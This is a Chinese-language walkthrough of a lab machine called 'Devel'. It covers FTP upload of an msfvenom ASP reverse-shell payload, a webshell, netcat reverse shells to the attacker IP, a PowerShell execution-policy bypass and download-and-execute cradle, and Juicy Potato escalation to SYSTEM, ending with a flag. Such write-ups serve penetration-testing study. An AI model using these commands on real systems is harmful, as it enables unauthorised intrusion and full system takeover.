# Devel

> victim: 10.10.10.5
>
> local: 10.10.14.19

## 扫描结果分析

可以看到开了80和21，简单一看就知道ftp对应的就是web服务的根目录

可以知道其语言为asp.net，系统是Windows

## 生成木马并上传

生成

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.19 LPORT=443 -f asp > myshell.asp
```

上传

```bash
ftp 10.10.10.5 #匿名用户名anonymous,密码为空

binary
put myshell.asp
```

## 获取Shell

本机使用msf监听

远程出现500错误，使用集成式木马好了

## 换用集成式木马

```bash
proxychains wget https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/aspcmd.asp
ftp 10.10.10.5
# anonymous
binary
put aspcmd.asp
```

成功获取webshell，不得不说这个webshell界面不错，但是一用Powershell就卡死，气人

得到系统信息如下

```
Microsoft Windows 7 Enterprise
X86-based PC
```

## 获取nc shell

```bash
# ftp
binary
put nc.exe
```

```bash
# webshell
# 找到网站根目录 C:\inetpub\wwwroot
nc.exe 10.10.14.19 443 -e cmd.exe
```

成功获取

## 获取Powershell

```shell
# ftp
binary
put re.ps1
```

```bash
# local
nc -lvvp 4444
```

```shell
powershell -File ./re.ps1
# 被限制策略禁止了
powershell -ExecutionPolicy Bypass -File ./re.ps1
```

成功获取Powershell

## Privilege Escalation 

```bash
proxychains4 wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1
```

```shell
python3 -m http.server
```

```powershell
iex(new-object net.webclient).downloadstring( "http://10.10.14.19:8000/PowerUp.ps1")
```

```
Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 1552
ProcessId   : 2608
Name        : 2608
Check       : Process Token Privileges
```

完全同PWK 10.11.1.13 Juicy Potato提权，但是本题是x86

先从官网下载代码，编译到x86架构

```
https://github.com/ohpe/juicy-potato
```

修改编译模式到x86架构，改为exe应用程序，子系统选择console程序而不是窗口程序

```bash
# ftp
binary
put JuicyPotato.exe
```
t.bat
```shell
whoami > C:\inetpub\wwwroot\res.txt
C:\inetpub\wwwroot\nc.exe 10.10.14.19 6666 -e cmd.exe
```

```shell
JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/k C:\inetpub\wwwroot\t.bat" -l 1337
```

成功获取到SYSTEM Shell

```
e621a0b5041708797c4fc4728bc72b4b
```

